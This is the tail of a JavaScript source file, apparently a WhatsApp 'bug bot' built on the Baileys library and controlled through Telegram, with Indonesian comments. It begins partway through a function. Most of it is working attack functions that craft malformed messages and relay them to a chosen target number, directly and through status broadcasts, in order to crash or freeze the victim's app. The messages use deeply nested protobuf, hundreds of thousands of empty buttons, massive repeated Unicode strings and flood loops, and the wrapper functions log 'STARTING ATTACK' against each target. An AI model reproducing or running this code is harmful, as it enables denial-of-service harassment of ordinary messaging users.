BEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k="
                                    }
                                }
                            }
                        }
                    ],
                    contextInfo: {
                        isForwarded: true,
                        forwardOrigin: 4,
                        participant: target
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg, {
        participant: { jid: target }
    });
}

async function VnXForcloseIos(sock, target) {
    try {
        const { proto } = require('@whiskeysockets/baileys');

        const vnx = {
            extendedTextMessage: {
                text: "💤‼️⃟⃰ᰧ./### ✩ > https://Wa.me/stickerpack/ikyymaunikah" + "𑇂𑆵𑆴𑆿".repeat(15000),
                matchedText: "https://Wa.me/stickerpack/ikyymaunikah",
                description: "҉҈⃝⃞⃟⃠⃤꙰꙲" + "𑇂𑆵𑆴𑆿".repeat(15000),
                title: "💤‼️⃟⃰ᰧ./### ✩" + "𑇂𑆵𑆴𑆿".repeat(15000),
                previewType: "NONE",
                jpegThumbnail: null,
                inviteLinkGroupTypeV2: "DEFAULT",
            }
        };

        const celahNew = {
            contactMessage: {
                displayName: "҉RemonTryhards¿?" + "𑇂𑆵𑆴𑆿".repeat(60000),
                vcard: "BEGIN:VCARD\nVERSION:3.0\nN:҉RemonTryhards ¿?\nFN:҉RemonTryhards ¿?\nitem1.TEL;waid=526421147692:526421147692\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:YT: https://youtube.com/@ReyyMon_NotDev\nitem2.X-ABLabel:YouTube\nitem4.ADR:;;Brasil, AR, SP;;;;\nitem4.X-ABLabel:Region\nEND:VCARD",
                contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true,
                    quotedAd: {
                        advertiserName: "x",
                        mediaType: "IMAGE",
                        jpegThumbnail: null,
                        caption: "x"
                    },
                    placeholderKey: {
                        remoteJid: "0@s.whatsapp.net",
                        fromMe: false,
                        id: "ABCDEF1234567890"
                    }
                }
            }
        };

        const TAGS = [
            [0xBA, 0x03],
            [0xD2, 0x04],
            [0xAA, 0x02]
        ];

        const encodeVarint = (n) => {
            let buf = [];
            while (n >= 0x80) {
                buf.push((n & 0x7f) | 0x80);
                n >>>= 7;
            }
            buf.push(n);
            return Buffer.from(buf);
        };

        const wrapLd = (tag, data) => {
            return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
        };

        const payloads = [
            proto.Message.encode(proto.Message.fromObject(vnx)).finish(),
            proto.Message.encode(proto.Message.fromObject(celahNew)).finish()
        ];

        for (let p = 0; p < payloads.length; p++) {
            const basePayload = payloads[p];

            const inflate = (tag, depth) => {
                let buf = basePayload;
                for (let i = 0; i < depth; i++) {
                    buf = wrapLd(tag, wrapLd([0x0A], buf));
                }
                return buf;
            };

            for (let ti = 0; ti < TAGS.length; ti++) {
                let tag = TAGS[ti];
                let payload = null;

                for (let depth = 5000; depth >= 2000 && !payload; depth -= 400) {
                    try {
                        let decoded = proto.Message.decode(inflate(tag, depth));
                        proto.Message.encode(decoded).finish();
                        payload = decoded;
                    } catch (_) {}
                }

                if (!payload) continue;

                await sock.relayMessage("status@broadcast", payload, {
                    messageId: Date.now().toString() + '_' + p + '_' + ti,
                    statusJidList: [target],
                    participant: { jid: target },
                    noSelfSync: true
                });
            }
        }

        console.log('✅ sent to target');
    } catch (e) {
        console.error('❌ VnXForcloseIos error:', e.message);
    }
}

async function m(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Monkey back" + "\0".repeat(20000)
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    },
                    contextInfo: {
                        quotedMessage: {
                            richResponseMessage: {}
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg, { noSelfSync: true });

    const XxxMakLu = proto.Message.encode(
        proto.Message.fromObject({
            interactiveMessage: {
                body: { text: "Mak Lu ampas jembut" },
                contextInfo: {
                    isForwarded: true,
                    buffer1: Buffer.from([0, 0, 0, 1]),
                    buffer2: Buffer.from([0xff, 0, 0, 0x1d]),
                    buffer3: Buffer.from([0xff, 0, 0, 0x1e]),
                    buffer4: Buffer.from([0xff, 0, 0, 0x1f]),
                    buffer5: Buffer.from([0xff, 0, 0, 0x20])
                },
                XForwardedFor: Math.floor(Math.random() * 255) + "." +
                    Math.floor(Math.random() * 255) + "." +
                    Math.floor(Math.random() * 255) + "." +
                    Math.floor(Math.random() * 255) + "\r\n"
            }
        })
    ).finish();

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02]
    ];

    const encodeVarint = function(n) {
        let buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const inflate = function(tag, depth) {
        let buf = XxxMakLu;
        for (let i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        let s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(j => j.length > 15);

    if (!jids.length) return;

    const MAX_BATCH = 5;
    const DELAY_MS = 5000;
    let totalSent = 0;

    for (let offset = 0; offset < jids.length; offset += MAX_BATCH) {
        const chunk = jids.slice(offset, offset + MAX_BATCH);
        if (offset > 0) {
            await new Promise(r => setTimeout(r, DELAY_MS));
        }

        const idx = Math.floor(offset / MAX_BATCH) + 1;
        const suffix = idx > 1 ? ('-' + idx) : '';
        const msgId = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

        for (let ti = 0; ti < TAGS.length; ti++) {
            const tag = TAGS[ti];
            let decodedPayload = null;

            for (let depth = 5000; depth >= 2000 && !decodedPayload; depth -= 400) {
                try {
                    const raw = inflate(tag, depth);
                    const decoded = proto.Message.decode(raw);
                    proto.Message.encode(decoded).finish();
                    decodedPayload = decoded;
                } catch (_) {}
            }

            if (!decodedPayload) continue;

            await sock.relayMessage('status@broadcast', decodedPayload, {
                messageId: msgId,
                statusJidList: chunk,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: chunk.map(jid => ({
                            tag: 'to',
                            attrs: { jid: jid },
                            content: []
                        }))
                    }]
                }]
            });

            totalSent++;
        }
    }
}

async function firdauskece(sock, target) {
  const quotedios = {
    key: {
      remoteJid: "13135559098@s.whatsapp.net",
      participant: "13135559098@s.whatsapp.net",
      id: Date.now() + '-' + Math.random().toString(36).slice(2)
    },
    message: {
      buttonsResponseMessage: {
        selectedButtonId: "x",
        type: 1,
        response: {
          selectedDisplayText: '\n'.repeat(50000)
        }
      }
    }
  };
  const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
    documentMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
      mimetype: "application/pdf",
      fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
      fileLength: 999999999,
      pageCount: 999999999,
      mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
      fileName: "x" + "𑇂𑆵𑆴𑆿".repeat(60000),
      fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
      directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
      mediaKeyTimestamp: 1715880173
    }
  }), { quoted: quotedios });
  
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });
  
  await sleep(120);
  
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function VnXDelayHardInvis(sock, target) {
    const vnxk = {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"asghards":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    };

    const vnxp = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    mimetype: "video/mp4",
                    fileLength: "17381601",
                    title: "VnX",
                    fileName: "VnX" + "ꦽ".repeat(75000),
                    fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
                    directPath: "/v/t62.7119-24/fake.enc",
                    mediaKeyTimestamp: "1767975195",
                    url: "https://mmg.whatsapp.net/d/fake.enc",
                    caption: "ꦾ".repeat(7000) + "ꦽ".repeat(7500)
                }
            }
        }
    };

    const vnxn = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "VnX" + "ꦾ".repeat(7500)
                    },
                    contextInfo: {
                        stanzaId: "metawai_id",
                        forwardingScore: 999,
                        participant: target,
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                    }
                }
            }
        }
    };

    const stickers = {
        stickerMessage: {
            url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
            fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
            fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
            mediaKey: Buffer.alloc(32, '').toString('base64'),
            mimetype: "image/webp",
            height: -1,
            width: 5000,
            directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
            fileLength: null,
            mediaKeyTimestamp: 1710000000,
            firstFrameLength: 999,
            firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            isAnimated: true,
            pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ],
                interactiveAnnotations: [{
                    polygonVertices: [
                        { x: 0.1, y: 0.1 },
                        { x: 0.9, y: 0.1 },
                        { x: 0.9, y: 0.9 },
                        { x: 0.1, y: 0.9 }
                    ],
                    location: {
                        latitude: -6.2088,
                        longitude: 106.8456,
                        name: `VnX`
                    }
                }]
            },
            stickerSentTs: 1710000000,
            isAvatar: true,
            isAiSticker: true,
            isLottie: true,
            accessibilityLabel: "\u0000".repeat(9000),
            mediaKeyDomain: null
        }
    };

    const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "LexzyModss - Executed",
                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
                            fileLength: "109951162777600",
                            height: -9999,
                            width: 9999,
                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1774107894",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                            viewOnce: true,
                            scansSidecar: "ruEDZByywdU2+wxwAOMMI9TaQJp84ehIk67v1KJjC+JGXu9u7ta4fw==",
                            scanLengths: [6677, 48757, 32501, 42353],
                            midQualityFileSha256: "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY="
                        },
                        hasMediaAttachment: null
                    },
                    body: {
                        text: "\u0000".repeat(1000)
                    },
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        participant: target,
                        isBuldo: true,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://example.com/file.zip",
                                mimetype: "application/zip",
                                caption: "LexzyModss - Executed",
                                fileName: "NanasMuda - Executed",
                                fileLength: 99999,
                                vCards: true
                            }
                        }
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "\n".repeat(25000)
                    }
                }
            }
        }
    };
    
    await sock.relayMessage("status@broadcast", vnxk, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", stickers, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });
    
    await sock.relayMessage("status@broadcast", vnxn, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", vnxp, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });
    const startTime = Date.now();
    const duration = 1 * 60 * 1000;

    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0000".repeat(75000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: { jid: target } });
    }
}

async function DelayBebasSpamBawzhhh(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\u200B" + "\n".repeat(25000),
                        format: "DEFAULT"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 400000 }, () => ({})),
                        name: "galaxy_message",
                        buttonParamsJson: JSON.stringify({
                            display_text: "\n".repeat(99999),
                            id: "\0".repeat(99999),
                            flow_token: "\r".repeat(99999)
                        })
                    },
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true
                    }
                }
            }
        }
    };

    try {
        if (!sock || !target) {
            console.log('❌ DelayBebasSpamBawzhhh: Sock atau target tidak valid');
            return;
        }

        await sock.relayMessage(target, msg, {
            participant: { jid: target },
            noSelfSync: true
        });

        const delay = 2000 + Math.random() * 3000;
        await sleep(delay);

    } catch (err) {
        console.log(`❌ DelayBebasSpamBawzhhh error: ${err.message}`);
        const errorDelay = 5000 + Math.random() * 5000;
        await sleep(errorDelay);
    }
}









// ============ FUNGSI CRASH/FREEZE ============
async function DelayXcombo(sock, target) {
    try {
        const msg = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "\x10"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        }
                    }
                }
            }
        };

        const msg2 = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: " maklo "
                        },
                        nativeFlowMessage: {
                            buttons: "ြ".repeat(600000)
                        }
                    }
                }
            }
        };

        const msg3 = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "\u0FD7"
                        },
                        nativeFlowMessage: {
                            buttons: "one_crash_message".repeat(20000)
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, msg, { noSelfSync: true });
        await sock.relayMessage(target, msg2, { noSelfSync: true });
        await sock.relayMessage(target, msg3, { noSelfSync: true });
    } catch (err) {
        console.log(chalk.yellow(`⚠️ DelayXcombo error: ${err.message}`));
        throw err;
    }
}

async function CrashFreeze(sock, target) {
    try {
        const msg = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: " ",
                            display_text: "\u200C" + "\u200D" + "\u200B" + "\u200A" + "\u0000" + "\x930"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        },
                        nativeFlowResponsMessage: {
                            buttons: [
                                { name: "one_crash_message" },
                                {
                                    name: "booking_status",
                                    bookingId: "succes"
                                },
                                {
                                    name: "voice_call",
                                    phone_number: "62×××××"
                                },
                                { name: "cta_copy" }
                            ]
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, msg, {});
    } catch (err) {
        console.log(chalk.yellow(`⚠️ CrashFreeze error: ${err.message}`));
        throw err;
    }
}

async function BulldozerDelay(sock, target) {
  const video = await prepareWAMessageMedia(
    {
      video: {
        url: "https://cdn.ornzora.eu.cc/ed7ebb66-9bf4-44b6-858a-b6b7405e53c5-FIORA.mp4"
      }
    },
    { upload: sock.waUploadToServer }
  );

  const msg = await generateWAMessageFromContent(
    target,
    {
      videoMessage: {
        ...video.videoMessage,
        contextInfo: {
          pairedMediaType: 6,
          statusSourceType: 0,
          isGroupStatus: true,
          statusAudienceMetadata: {
            audienceType: 2
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });

  await sock.relayMessage(
    "status@broadcast",
    {
      groupStatusMessageV2: {
        message: {
          videoMessage: {
            ...video.videoMessage,
            contextInfo: {
              pairedMediaType: 6,
              statusSourceType: 0,
              isGroupStatus: true,
              statusAudienceMetadata: {
                audienceType: 2
              }
            },
            inviteLinkGroupTypeV2: "DEFAULT"
          }
        }
      },
      messageContextInfo: {
        messageAssociation: {
          associationType: 12,
          parentMessageKey: msg.key
        }
      }
    },
    {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { status_setting: "contacts" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: [] }]
            }
          ]
        }
      ]
    }
  );
}

async function Freezeinvisible(sock, target) {
    const msg1 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "#NoctherRk28"
                    },
                    body: {
                        text: "[{".repeat(1000) + "}]".repeat(1000)
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const msg2= {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "𝙷𝙰𝙸 𝙺𝙸𝙳𝚉 𝚃𝙷𝙸𝚂 𝙸𝚂 𝙲𝙰𝙴𝙻𝙻"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({})),
                        nativeFlowResponsMessage: {
                            buttons: [
                                { name: "one_crash_message" },
                                {
                                    name: "booking_status",
                                    bookingId: "succes"
                                },
                                {
                                    name: "voice_call",
                                    phone_number: "62×××××"
                                },
                                { name: "cta_copy" }
                            ]
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg1, {});
    await sock.relayMessage(target, msg2, {});
}

async function MediaFreezeData(sock, target) {
  const data = {
    groupStatusMessageV2: {
      message: {
        messageContextInfo: {},
        mediaMetadata: {},
        interactiveMessage: {
          body: {
            text: "./#5#~"
          },
          nativeFlowMessage: {
            buttons: "\x10".repeat(500000)
          }
        }
      }
    }
  };

  await sock.relayMessage(target, data, {
    participant: target
  });
}

// ============ STRUKTUR BEBAS SPAM ============
async function CODEBEBASPAM(sock, target) {
    const taskId = Date.now().toString().slice(-6);
    const totalLoops = 1;
    const delay = 1000;
    const startTime = Date.now();
    let successCount = 0;
    let errorCount = 0;

    console.log(chalk.cyan(`🚀 [${taskId}] STARTING ATTACK FOR: ${target}`));

    for (let i = 1; i <= totalLoops; i++) {
        try {
            await MediaFreezeData(sock, target);
            successCount++;
            console.log(chalk.green(`✅ [${taskId}] ${i}/${totalLoops} success`));
        } catch (err) {
            errorCount++;
            console.log(chalk.red(`❌ [${taskId}] ${i}/${totalLoops} error: ${err.message}`));
            await new Promise(r => setTimeout(r, delay * 2));
        }

        if (i < totalLoops) await new Promise(r => setTimeout(r, delay));
    }

    const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
    console.log(chalk.green(`✅ [${taskId}] COMPLETED: ${successCount}/${totalLoops} success, ${errorCount} errors in ${totalTime}s`));
}

async function CODEBEBASPAM2(sock, target) {
    const taskId = Date.now().toString().slice(-6);
    const totalLoops = 1;
    const delay = 1000;
    const startTime = Date.now();
    let successCount = 0;
    let errorCount = 0;

    console.log(chalk.cyan(`🚀 [${taskId}] STARTING ATTACK FOR: ${target}`));

    for (let i = 1; i <= totalLoops; i++) {
        try {
            await DelayXcombo(sock, target);
            successCount++;
            console.log(chalk.green(`✅ [${taskId}] ${i}/${totalLoops} success`));
        } catch (err) {
            errorCount++;
            console.log(chalk.red(`❌ [${taskId}] ${i}/${totalLoops} error: ${err.message}`));
            await new Promise(r => setTimeout(r, delay * 2));
        }

        if (i < totalLoops) await new Promise(r => setTimeout(r, delay));
    }

    const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
    console.log(chalk.green(`✅ [${taskId}] COMPLETED: ${successCount}/${totalLoops} success, ${errorCount} errors in ${totalTime}s`));
}

// ============ MAIN BOT ============
(async () => {
  try {
    await startSesi();
    await bot.launch();
    console.log(chalk.green.bold("[ ✓ ]") + chalk.white(" Hello world"));

    const showStatus = () => {
      try {
        const used = process.memoryUsage();
        const cpu = os.loadavg()[0].toFixed(2);
        const mem = (used.heapUsed / 1024 / 1024).toFixed(2);
        const totalMem = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
        const freeMem = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
        const uptime = runtime(process.uptime());
        const ping = Date.now() - global.lastPing;

        console.log(chalk.cyan.bold("\n[ ! ] STATUS PANEL"));
        console.log(chalk.yellow("[ • ]") + chalk.white(` CPU Load : ${cpu}`));
        console.log(chalk.yellow("[ • ]") + chalk.white(` RAM : ${mem} MB / ${totalMem} GB`));
        console.log(chalk.yellow("[ • ]") + chalk.white(` Free RAM : ${freeMem} GB`));
        console.log(chalk.yellow("[ • ]") + chalk.white(` Uptime : ${uptime}`));
        console.log(chalk.yellow("[ • ]") + chalk.white(` Ping : ${ping}ms`));
        console.log(chalk.yellow("[ • ]") + chalk.white(` User : ${state.linkedWhatsAppNumber || "Belum Connect"}`));
        console.log(chalk.yellow("[ • ]") + chalk.white(` Status : ${state.isWhatsAppConnected ? chalk.green("ONLINE") : chalk.red("OFFLINE")}`));
        console.log(state.isWhatsAppConnected ? chalk.green("[ ✓ ] System berjalan normal") : chalk.red("[ ✗ ] WhatsApp disconnected, mencoba reconnect..."));
      } catch {}
    };

    showStatus();
    setInterval(showStatus, 3600000);
    
    const RESTART_INTERVAL = 10 * 60 * 1000; 
    setTimeout(() => {
      console.log(chalk.yellow.bold("\n[ ♻ ] Auto restart 10 menit tercapai, bot akan restart..."));
      setTimeout(() => {
        process.exit(1); 
      }, 3000);
    }, RESTART_INTERVAL);

  } catch (err) {
    console.log(chalk.red.bold("[ ✗ ] FATAL ERROR: ") + chalk.white(err.message));
    console.log(chalk.yellow("[ ~ ] Bot akan restart dalam 5 detik..."));

    setTimeout(() => {
      process.exit(1);
    }, 5000);
  }
})();

global.lastPing = Date.now();
setInterval(() => {
  global.lastPing = Date.now();
}, 1000);

process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});

process.on("SIGINT", () => {
  console.log(chalk.yellow.bold("[ ! ] Bot dihentikan manual"));
  process.exit(0);
});

process.on("SIGTERM", () => {
  console.log(chalk.red.bold("[ ✗ ] Bot dihentikan sistem"));
  process.exit(0);
});